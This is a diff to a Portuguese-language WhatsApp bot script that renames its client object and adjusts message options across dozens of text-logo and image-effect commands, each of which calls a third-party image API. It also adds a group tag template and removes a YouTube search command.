+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'halloweenfire':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8190,7 +7547,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/HalloweenFire?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'lava':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8200,7 +7557,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/Lava?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'steeltext':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8210,7 +7567,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/SteelText?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'captainamerica':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8220,7 +7577,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/CaptainAmerica?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'toxic':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8230,7 +7587,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/Toxic?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'chocolate':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8240,7 +7597,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/Chocolate?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'matrix':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8250,7 +7607,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/Matrix?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'horrorblood':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8260,7 +7617,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/HorrorBlood?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'thunder2':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8270,7 +7627,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/Thunder2?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case '3dbox':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8280,7 +7637,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/3DBox?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'naturalleaves':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8290,7 +7647,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/natural-leaves?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'blackpink':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8300,7 +7657,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/black-pink?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'dropwater':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8310,7 +7667,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/drop-water?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'christmas':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8320,7 +7677,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/christmas?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case '3dgradient':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8330,14 +7687,27 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/3d-gradient?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
+                   case 'tagg':
+                  if (!isGroupAdmins) return reply('Você precisa ser adm')
+                   const tag = `‼️𝑶𝑩𝑹𝑰𝑮𝑨𝑻𝑶́𝑹𝑰𝑶 𝑼𝑺𝑶 𝑫𝑨 𝑻𝑨𝑮‼️
+
+𝛹
+𝛹(nick)𝛹
+♕(nick)♛
+(Nick)🔱🔥
+🔱🔥(Nick)
+
+𝙏𝘼͢ 𝙄𝙈𝙋𝙀͢͢𝙍𝙄𝙐͢𝙈,𝙏𝘼 𝘾͢𝙊𝙈 𝘿𝙀͢𝙐𝙎🔱͢🔥`
+reply(tag)
+break
 case 'halloween':
 if (!isPremium) return fakegroup (mess.only.premium)
 if (args.length == 0) return reply(`Use: ${prefix + command} text\nExemplo: ${prefix + command} Bot`)
 txt = args.join(" ")
 buffer = await getBuffer(`https://pencarikode.xyz/api/textpro/halloween?text=${txt}&apikey=pais`)
-tomioka.sendMessage(from, buffer, image, {caption: 'está ai', quoted: ftoko, thumbnail:null})
+client.sendMessage(from, buffer, image, {caption: 'está ai', quoted: ftoko ,contextInfo: tomis, thumbnail:null})
 break
 case 'space':
 if (!isPremium) return fakegroup (mess.only.premium)
@@ -8347,7 +7717,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                       team = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/space-3d?apikey=apiteam&texto1=${teks1}&texto2=${teks2}`)
                       of = await getBuffer(team.resultado)
                       hero = await getBuffer(`https://i.ibb.co/3h6M64p/48bb51875d47.jpg`)
-                      tomioka.sendMessage(from, of, image, {quoted: ftoko})
+                      client.sendMessage(from, of, image, {quoted: ftoko ,contextInfo: tomis})
                       break
 
 case 'glitch2':
@@ -8359,7 +7729,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                       reply('[❗]ESPERE ...')
                       team = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/glitch1?apikey=apiteam&texto1=${teks1}&texto2=${teks2}`)
                       buff = await getBuffer(team.resultado)
-                      tomioka.sendMessage(from, buff, image, {quoted: ftoko})
+                      client.sendMessage(from, buff, image, {quoted: ftoko ,contextInfo: tomis})
                       break
                 case 'glitch':
                 if (!isPremium) return fakegroup (mess.only.premium)
@@ -8368,7 +7738,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                       reply('[❗]ESPERE ...')
                       anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/glitch2?apikey=apiteam&texto=${teks}`)
                       buff = await getBuffer(anu.resultado)
-                      tomioka.sendMessage(from, buff, image, {quoted: ftoko})
+                      client.sendMessage(from, buff, image, {quoted: ftoko ,contextInfo: tomis})
                       break
                       case 'demon':
                       if (!isPremium) return fakegroup (mess.only.premium)
@@ -8377,7 +7747,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                       reply('[❗]ESPERE ...')
                       anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/demon?apikey=darling&texto=${teks}`)
                       buff = await getBuffer(anu.resultado)
-                      tomioka.sendMessage(from, buff, image, {quoted: ftoko})
+                      client.sendMessage(from, buff, image, {quoted: ftoko ,contextInfo: tomis})
                       break
                       case 'toxic':
                       if (!isPremium) return fakegroup (mess.only.premium)
@@ -8386,7 +7756,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                       reply('[❗]ESPERE ...')
                       anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/toxic?apikey=apiteam&texto=${teks}`)
                       buff = await getBuffer(anu.resultado)
-                      tomioka.sendMessage(from, buff, image, {quoted: ftoko})
+                      client.sendMessage(from, buff, image, {quoted: ftoko ,contextInfo: tomis})
                       break
                       case 'transformer':
                       if (!isPremium) return fakegroup (mess.only.premium)
@@ -8395,7 +7765,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                       reply('[❗]ESPERE ...')
                       anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/transformer?apikey=apiteam&texto=team=${teks}`)
                       buff = await getBuffer(anu.resultado)
-                      tomioka.sendMessage(from, buff, image, {quoted: ftoko})
+                      client.sendMessage(from, buff, image, {quoted: ftoko ,contextInfo: tomis})
                       break
                       case 'graffiti':
                       if (!isPremium) return fakegroup (mess.only.premium)
@@ -8406,7 +7776,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                       reply('[❗]ESPERE ...')
                       team = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/graffiti?apikey=apiteam&texto1=${teks1}&texto2={teks2}`)
                       buff = await getBuffer(team.resultado)
-                      tomioka.sendMessage(from, buff, image, {quoted: ftoko})
+                      client.sendMessage(from, buff, image, {quoted: ftoko ,contextInfo: tomis})
                       break
                       case 'blackpink':
                       if (!isPremium) return fakegroup (mess.only.premium)
@@ -8417,7 +7787,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                       reply('[❗]ESPERE ...')
                       team = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/glitch1?apikey=apiteam&texto1=${teks1}&texto2=${teks2}`)
                       buff = await getBuffer(team.resultado)
-                      tomioka.sendMessage(from, buff, image, {quoted: ftoko})
+                      client.sendMessage(from, buff, image, {quoted: ftoko ,contextInfo: tomis})
                       break
                       case 'thunder':
                       if (!isPremium) return fakegroup (mess.only.premium)
@@ -8426,7 +7796,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                       reply('[❗]ESPERE ...')
                       anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/thunder?apikey=apiteam&texto=${teks}`)
                       buff = await getBuffer(anu.resultado)
-                      tomioka.sendMessage(from, buff, image, {quoted: ftoko})
+                      client.sendMessage(from, buff, image, {quoted: ftoko ,contextInfo: tomis})
                       break
                       case 'thunderv2':
                       if (!isPremium) return fakegroup (mess.only.premium)
@@ -8435,7 +7805,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                       reply('[❗]ESPERE ...')
                       anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/thunderv2?apikey=apiteam&texto=team=${teks}`)
                       buff = await getBuffer(anu.resultado)
-                      tomioka.sendMessage(from, buff, image, {quoted: ftoko})
+                      client.sendMessage(from, buff, image, {quoted: ftoko ,contextInfo: tomis})
                       break
                       case 'harrypotter':
                       if (!isPremium) return fakegroup (mess.only.premium)
@@ -8444,7 +7814,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                       reply('[❗]ESPERE ...')
                       anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/harrypotter2?apikey=apiteam&texto=${teks}`)
                       buff = await getBuffer(anu.resultado)
-                      tomioka.sendMessage(from, buff, image, {quoted: ftoko})
+                      client.sendMessage(from, buff, image, {quoted: ftoko ,contextInfo: tomis})
                       break
                       case 'pornhub':
                       if (!isPremium) return fakegroup (mess.only.premium)
@@ -8455,7 +7825,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                       reply('[❗]ESPERE ...')
                       team = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/pornhub?apikey=apiteam&texto1=${teks1}&texto2=${teks2}`)
                       buff = await getBuffer(team.resultado)
-                      tomioka.sendMessage(from, buff, image, {quoted: ftoko})
+                      client.sendMessage(from, buff, image, {quoted: ftoko ,contextInfo: tomis})
                       break
                       case 'neon3d':
                       if (!isPremium) return fakegroup (mess.only.premium)
@@ -8464,7 +7834,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                       reply('[❗]ESPERE ...')
                       anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/neon3d?texto=${teks}&apikey=apiteam`)
                       buff = await getBuffer(anu.resultado)
-                      tomioka.sendMessage(from, buff, image, {quoted: ftoko})
+                      client.sendMessage(from, buff, image, {quoted: ftoko ,contextInfo: tomis})
                       break
                       case 'horrorblood':
                       if (!isPremium) return fakegroup (mess.only.premium)
@@ -8473,7 +7843,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                       reply('[❗]ESPERE ...')
                       anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/horror-blood?texto=${teks}&apikey=apiteam`)
                       buff = await getBuffer(anu.resultado)
-                      tomioka.sendMessage(from, buff, image, {quoted: ftoko})
+                      client.sendMessage(from, buff, image, {quoted: ftoko ,contextInfo: tomis})
                       break
                       case 'neondevil':
                       if (!isPremium) return fakegroup (mess.only.premium)
@@ -8482,7 +7852,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                       reply('[❗]ESPERE ...')
                       anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/neon-devil?texto=${teks}&apikey=apiteam`)
                       buff = await getBuffer(anu.resultado)
-                      tomioka.sendMessage(from, buff, image, {quoted: ftoko})
+                      client.sendMessage(from, buff, image, {quoted: ftoko ,contextInfo: tomis})
                       break
                       case 'dropwater':
                       if (!isPremium) return fakegroup (mess.only.premium)
@@ -8491,7 +7861,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                       reply('[❗]ESPERE ...')
                       anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/dropwater?apikey=apiteam&texto=${teks}`)
                       buff = await getBuffer(anu.resultado)
-                      tomioka.sendMessage(from, buff, image, {quoted: ftoko})
+                      client.sendMessage(from, buff, image, {quoted: ftoko ,contextInfo: tomis})
                       break
                       case 'advancedglow':
                       if (!isPremium) return fakegroup (mess.only.premium)
@@ -8500,7 +7870,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                       reply('[❗]ESPERE ...')
                       anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/advanced-glow?apikey=apiteam&texto=${teks}`)
                       buff = await getBuffer(anu.resultado)
-                      tomioka.sendMessage(from, buff, image, {quoted: ftoko})
+                      client.sendMessage(from, buff, image, {quoted: ftoko ,contextInfo: tomis})
                       break
                       case 'wonderfulgraffiti':
                       if (!isPremium) return fakegroup (mess.only.premium)
@@ -8509,7 +7879,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                       reply('[❗]ESPERE ...')
                       anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/wonderful-graffiti?apikey=apiteam&texto=${teks}`)
                       buff = await getBuffer(anu.resultado)
-                      tomioka.sendMessage(from, buff, image, {quoted: ftoko})
+                      client.sendMessage(from, buff, image, {quoted: ftoko ,contextInfo: tomis})
                       break
                       case 'dropwater':
                       if (!isPremium) return fakegroup (mess.only.premium)
@@ -8518,7 +7888,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                       reply('[❗]ESPERE ...')
                       anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/dropwater?apikey=apiteam&texto=${teks}`)
                       buff = await getBuffer(anu.resultado)
-                      tomioka.sendMessage(from, buff, image, {quoted: ftoko})
+                      client.sendMessage(from, buff, image, {quoted: ftoko ,contextInfo: tomis})
                       break
                       case 'captainamerica':
                       if (!isPremium) return fakegroup (mess.only.premium)
@@ -8527,7 +7897,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                       reply('[❗]ESPERE ...')
                       anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/captain-america?apikey=apiteam&texto=${teks}`)
                       buff = await getBuffer(anu.resultado)
-                      tomioka.sendMessage(from, buff, image, {quoted: ftoko})
+                      client.sendMessage(from, buff, image, {quoted: ftoko ,contextInfo: tomis})
                       break
                           case 'jokerlogo':
                           if (!isPremium) return fakegroup (mess.only.premium)
@@ -8536,7 +7906,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                       reply('[❗]ESPERE ...')
                       anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/jokerlogo?apikey=apiteam&texto=${teks}`)
                       buff = await getBuffer(anu.resultado)
-                      tomioka.sendMessage(from, buff, image, {quoted: ftoko})
+                      client.sendMessage(from, buff, image, {quoted: ftoko ,contextInfo: tomis})
                       break
                       case 'marvel':
                       if (!isPremium) return fakegroup (mess.only.premium)
@@ -8545,7 +7915,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                       reply('[❗]ESPERE ...')
                       anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/marvel?apikey=apiteam&texto1=${teks1}&texto2={teks2}`)
                       buff = await getBuffer(anu.resultado)
-                      tomioka.sendMessage(from, buff, image, {quoted: ftoko})
+                      client.sendMessage(from, buff, image, {quoted: ftoko ,contextInfo: tomis})
                       break
                       case 'lavatext':
                       if (!isPremium) return fakegroup (mess.only.premium)
@@ -8553,7 +7923,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                       team = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/lava-text?apikey=apiteam&texto1=${team}`)
                       of = await getBuffer(team.resultado)
                       hero = await getBuffer(`https://i.ibb.co/3h6M64p/48bb51875d47.jpg`)
-                      tomioka.sendMessage(from, of, image, {quoted: ftoko, thumbnail: hero})
+                      client.sendMessage(from, of, image, {quoted: ftoko ,contextInfo: tomis, thumbnail: hero})
                       break
                       case 'magma':
                       if (!isPremium) return fakegroup (mess.only.premium)
@@ -8561,7 +7931,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                       team = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/magma-text?apikey=apiteam&texto=${team}`)
                       of = await getBuffer(team.resultado)
                       hero = await getBuffer(`https://i.ibb.co/3h6M64p/48bb51875d47.jpg`)
-                      tomioka.sendMessage(from, of, image, {quoted: ftoko, thumbnail: hero})
+                      client.sendMessage(from, of, image, {quoted: ftoko ,contextInfo: tomis, thumbnail: hero})
                       break
                       case 'matrix':
                       if (!isPremium) return fakegroup (mess.only.premium)
@@ -8569,7 +7939,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                       team = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/matrix-text?texto=${team}&apikey=apiteam`)
                       of = await getBuffer(team.resultado)
                       hero = await getBuffer(`https://i.ibb.co/3h6M64p/48bb51875d47.jpg`)
-                      tomioka.sendMessage(from, of, image, {quoted: ftoko, thumbnail: hero})
+                      client.sendMessage(from, of, image, {quoted: ftoko ,contextInfo: tomis, thumbnail: hero})
                       break
                       case 'breakwall':
                       if (!isPremium) return fakegroup (mess.only.premium)
@@ -8577,7 +7947,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                       team = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/break-wall?apikey=apiteam&texto=${team}`)
                       of = await getBuffer(team.resultado)
                       hero = await getBuffer(`https://i.ibb.co/3h6M64p/48bb51875d47.jpg`)
-                      tomioka.sendMessage(from, of, image, {quoted: ftoko, thumbnail: hero})
+                      client.sendMessage(from, of, image, {quoted: ftoko ,contextInfo: tomis, thumbnail: hero})
                       break
 case 'tel':
 teks = body.slice(4)
@@ -8608,7 +7978,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
 					if (teks.length > 10) return fakegroup ('O texto é longo, até 10 caracteres')
 					reply('*Estou fazendo, se der erro tente novamente ✓*')
 					buffer = await getBuffer(`https://hadi-api.herokuapp.com/api/photoxy/underwater?teks=${teks}`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: '🌺prontinho mano🌺'})
+					client.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: '🌺prontinho mano🌺'})
 					break
 case 'textmar': 
 if (!isPremium) return fakegroup (mess.only.premium)
@@ -8617,7 +7987,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
 					if (teks.length > 10) return fakegroup ('O texto é longo, até 10 caracteres')
 					reply('*Estou fazendo, se der erro tente novamente ✓*')
 					buffer = await getBuffer(`https://hadi-api.herokuapp.com/api/photoxy/underwater?teks=${teks}`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: '🌺prontinho mano🌺'})
+					client.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: '🌺prontinho mano🌺'})
 					break
 					case 'bneon': 
 					if (!isPremium) return fakegroup (mess.only.premium)
@@ -8626,7 +7996,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
 					if (teks.length > 15) return fakegroup ('O texto é longo, até 15 caracteres')
 					reply('*Estou fazendo, se der erro tente novamente ✓*')
 					buffer = await getBuffer(`https://api.zeks.xyz/api/bneon?apikey=cAdmS2XqIbRSP3vYAdqHvYqAD6W&text=${teks}`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: '🌺prontinho🌺'})
+					client.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: '🌺prontinho🌺'})
 					break
 					case 'naruto': 
 					if (!isPremium) return fakegroup (mess.only.premium)
@@ -8635,7 +8005,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
 					if (teks.length > 15) return fakegroup ('O texto é longo, até 15 caracteres')
 					reply('*Estou fazendo, se der erro tente novamente ✓*')
 					buffer = await getBuffer(`https://api.zeks.xyz/api/naruto?apikey=cAdmS2XqIbRSP3vYAdqHvYqAD6W&text=${teks}`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: '🌺prontinho🌺'})
+					client.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: '🌺prontinho🌺'})
 					break
 case '3dcube': 
 if (!isPremium) return fakegroup (mess.only.premium)
@@ -8644,7 +8014,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
 					if (teks.length > 10) return fakegroup ('O texto é longo, até 10 caracteres')
 					reply('*Estou fazendo, se der erro tente novamente ✓*')
 					buffer = await getBuffer(`https://hadi-api.herokuapp.com/api/photoxy/under-cube?teks=${teks}`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: '🌺prontinho mano🌺'})
+					client.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: '🌺prontinho mano🌺'})
 					break
 
 					case 'cross': 
@@ -8654,7 +8024,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
 					if (teks.length > 10) return fakegroup ('O texto é longo, até 10 caracteres')
 					reply('*Estou fazendo, se der erro tente novamente ✓*')
 					buffer = await getBuffer(`https://api.zeks.xyz/api/crosslogo?apikey=cAdmS2XqIbRSP3vYAdqHvYqAD6W&text=${teks}`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: '😊ta ai'})
+					client.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: '😊ta ai'})
 					break
 					case 'wolf': 
 					if (!isPremium) return fakegroup (mess.only.premium)
@@ -8668,7 +8038,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
 
 					buffer = await getBuffer(`https://api.zeks.xyz/api/wolflogo?apikey=hAin9sRj99puPHGV5KU1tDEizr7&text1=${teks}&text2=${teks}`)
 
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: '😊ta ai'})
+					client.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: '😊ta ai'})
 
 					break
 
@@ -8685,39 +8055,9 @@ if (!isPremium) return fakegroup (mess.only.premium)
 
 					buffer = await getBuffer(`https://api.zeks.xyz/api/flametext?apikey=hAin9sRj99puPHGV5KU1tDEizr7&text=${teks}`)
 
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: '😊ta ai'})
+					client.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: '😊ta ai'})
 
 					break
-case 'ytsrc':     //case by: Bielzinho-Bot // nao remova os créditos
-if (!isPremium) return fakegroup (mess.only.premium)
-teks = body.slice(7)  
-anu = await fetchJson(`http://brizas-api.herokuapp.com/sociais/youtubesrc?apikey=brizaloka&query=${teks}`)
-const objs = []
-for(i=0;i< anu.resultados.length; ++i) {
-let data = {
-rowId: `${prefix}playy `+ anu.resultados[i].title,
-title: `${prefix}tocar`,
-description: anu.resultados[i].title
-}
-objs.push(data)
-}
-payload = {
-listMessage: {
-title: "✅ Músicas encotradas ✅",
-buttonText: "Mostra lista de músicas",
-description: `Palavra chave: ${teks}`,
-listType: 1,
-sections: [
-{
-title: "Músicas relacionadas",
-rows: objs
-}
-]
-}
-}
-let preparedPayload = await tomioka.prepareMessageFromContent(from, payload,{});
-await tomioka.relayWAMessage(preparedPayload, {waitForAck: true})
-break
 				case 'sky': 
 				    if (!isPremium) return fakegroup (mess.only.premium)
 					if (args.length < 1) return fakegroup (mess.blank)
@@ -8730,7 +8070,7 @@ break
 
 					buffer = await getBuffer(`https://api.zeks.xyz/api/skytext?apikey=hAin9sRj99puPHGV5KU1tDEizr7&text=${teks}`)
 
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: '😊ta ai'})
+					client.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: '😊ta ai'})
 
 					break
                     case 'litig': 
@@ -8740,7 +8080,7 @@ break
 					if (teks.length > 10) return fakegroup ('O texto é longo, até 10 caracteres')
 					reply('*Estou fazendo, se der erro tente novamente ✓*')
 					buffer = await getBuffer(`https://api.zeks.xyz/api/lithgtext?apikey=hAin9sRj99puPHGV5KU1tDEizr7&text=${teks}`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: 'tai'})
+					client.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: 'tai'})
